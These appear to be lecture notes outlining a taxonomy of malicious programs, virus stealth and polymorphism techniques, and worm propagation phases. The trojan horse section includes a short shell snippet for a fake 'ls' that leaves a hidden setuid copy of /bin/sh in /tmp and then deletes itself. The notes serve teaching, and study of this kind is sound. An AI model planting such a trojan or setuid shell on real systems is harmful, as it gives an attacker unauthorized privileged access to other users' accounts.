## taxonomy of malicious programs
- malicious programs
    - needs host program
        - trapdoors
        - logic bombs
        - trojan horses
        - viruses
    - independent
        - worms
        - zombies
        - rootkits

## trojan horse
example attacker:
replace
```
cp /bin/sh /tmp/.xxsh
chmod u+s,o+x /tmp/.xxsh
rm ./ls
ls $*
```
as /homes/victim/ls

## virus
- self-replicating code
    - like replicating trojan horse
    - alters normal code with "infected" version

## virus properties
- terminate and stay resident
    - stays active in memory after application complete
    - allows infection of previously unknow files
        -trap calls that execute a program
- stealth
    - conceal infection
        - trap read and disinfect
        - let execute call infected file
    - encrypt virus code
        - prevents "signature" to detect virus
    - polymorphism
        - change virus code to prevent signature
        - encryption plus varying decryption code
    - metamorphism
        - change code to equivalent alternatives

## worm
- runs independently
    - does not require a host program
- propagates a fully working version of itself to other machines
- carrie a payload performing hidden tasks
    - backdoor, spam relays, DDoS agents
- phases
    - probing -> exploitation -> replication -> payload -> probing ...
